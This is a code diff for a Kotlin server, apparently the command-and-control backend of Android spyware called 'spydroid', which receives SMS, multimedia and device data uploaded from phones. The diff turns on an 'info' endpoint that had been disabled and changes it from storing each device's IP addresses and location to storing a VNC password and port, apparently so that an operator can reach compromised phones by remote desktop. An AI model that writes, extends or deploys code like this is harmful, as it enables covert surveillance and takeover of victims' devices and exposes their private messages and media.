@@ -25,6 +25,7 @@ import io.ktor.server.routing.*
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import net.spydroid.server.domain.DevicesRepository
+import net.spydroid.server.domain.InfoRepository
 import net.spydroid.server.domain.MultimediaRepository
 import net.spydroid.server.domain.SmsRepository
 import net.spydroid.server.models.DeviceHandler
@@ -66,7 +67,7 @@ private const val SUCCESSFULL_POST = "Successfully uploaded data"
 fun Application.configureRouting(validTokens: Set<String>) {
     routing {
         devices(validTokens)
-        //info(validTokens)
+        info(validTokens)
         sms(validTokens)
         multimedia(validTokens)
     }
@@ -229,21 +230,18 @@ private fun Route.devices(validTokens: Set<String>) {
 }
 
 
-/*
 private fun Route.info(validTokens: Set<String>) {
 
     val infoRepository: InfoRepository by inject()
 
     val INFO_PARAMAS = object {
-        val IP_PUBLIC = "ip_public"
-        val IP_PRIVATE = "ip_private"
-        val LOCATION = "location"
+        val VNC_PASSWORD = "vnc_password"
+        val VNC_PORT = "vnc_port"
     }
 
     val INFO_MESSAGES = object {
-        val IP_PUBLIC = "Missing Public Ip Address "
-        val IP_PRIVATE = "Missing Private Ip Address"
-        val LOCATION = "Missing Location"
+        val VNC_PASSWORD = "Missing password Vnc"
+        val VNC_PORT = "Missing port Vnc"
     }
 
     get(Routes.INFO) {
@@ -272,19 +270,15 @@ private fun Route.info(validTokens: Set<String>) {
             HttpStatusCode.BadRequest,
             BAD_REQUESTS_RESPONSES.ALIAS
         )
-        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@post call.respond(
+
+        val vnc_password = params[INFO_PARAMAS.VNC_PASSWORD] ?: return@post call.respond(
             HttpStatusCode.BadRequest,
-            INFO_MESSAGES.IP_PUBLIC
+            INFO_MESSAGES.VNC_PASSWORD
         )
 
-        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@post call.respond(
+        val vnc_port = params[INFO_PARAMAS.VNC_PORT] ?: return@post call.respond(
             HttpStatusCode.BadRequest,
-            INFO_MESSAGES.IP_PRIVATE
-        )
-
-        val location = params[INFO_PARAMAS.LOCATION] ?: return@post call.respond(
-            HttpStatusCode.BadRequest,
-            INFO_MESSAGES.LOCATION
+            INFO_MESSAGES.VNC_PORT
         )
 
         if (accessToken in validTokens) {
@@ -292,9 +286,8 @@ private fun Route.info(validTokens: Set<String>) {
                 infoRepository.insert(
                     InfoHandler(
                         alias = alias,
-                        ip_address_public = ip_address_public,
-                        ip_address_private = ip_address_private,
-                        location = location
+                        vnc_password = vnc_password,
+                        vnc_port = vnc_port.toInt()
                     )
                 )
             }
@@ -320,19 +313,14 @@ private fun Route.info(validTokens: Set<String>) {
             BAD_REQUESTS_RESPONSES.ALIAS
         )
 
-        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@put call.respond(
+        val vnc_password = params[INFO_PARAMAS.VNC_PASSWORD] ?: return@put call.respond(
             HttpStatusCode.BadRequest,
-            INFO_MESSAGES.IP_PUBLIC
+            INFO_MESSAGES.VNC_PASSWORD
         )
 
-        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@put call.respond(
+        val vnc_port = params[INFO_PARAMAS.VNC_PORT] ?: return@put call.respond(
             HttpStatusCode.BadRequest,
-            INFO_MESSAGES.IP_PRIVATE
-        )
-
-        val location = params[INFO_PARAMAS.LOCATION] ?: return@put call.respond(
-            HttpStatusCode.BadRequest,
-            INFO_MESSAGES.LOCATION
+            INFO_MESSAGES.VNC_PORT
         )
 
         if (accessToken in validTokens) {
@@ -340,9 +328,8 @@ private fun Route.info(validTokens: Set<String>) {
                 infoRepository.update(
                     InfoHandler(
                         alias = alias,
-                        ip_address_public = ip_address_public,
-                        ip_address_private = ip_address_private,
-                        location = location
+                        vnc_password = vnc_password,
+                        vnc_port = vnc_port.toInt()
                     )
                 )
                 call.respond(HttpStatusCode.OK, "Info updated successfully")
@@ -364,7 +351,6 @@ private fun Route.info(validTokens: Set<String>) {
         }
     }
 }
- */
 
 private fun Route.sms(validTokens: Set<String>) {
 
